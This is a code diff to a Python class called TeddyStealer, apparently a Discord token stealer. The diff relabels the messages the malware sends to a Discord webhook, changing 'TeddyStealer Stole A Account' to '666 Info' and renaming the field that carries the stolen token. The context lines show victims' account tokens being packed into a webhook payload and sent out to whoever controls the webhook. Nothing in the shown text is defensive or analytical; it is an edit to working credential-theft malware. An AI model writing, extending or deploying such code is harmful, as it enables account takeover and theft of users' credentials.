@@ -72,10 +72,10 @@ class TeddyStealer(functions):
             if "username" in user:
                 if config.get('webhook'):
                     webhook_data = {
-                        "username": "TeddyStealer",
+                        "username": "666",
                         "embeds": [
                             {
-                                "title": 'TeddyStealer Stole A Account',
+                                "title": '666 Info',
                                 "color": color,
                                 'fields': [
                                     {
@@ -89,7 +89,7 @@ class TeddyStealer(functions):
                                         "inline": True
                                     },
                                     {   
-                                        "name": " Token",
+                                        "name": "DS Token",
                                         "value": f"||{token}||",
                                         "inline": False
                                     },
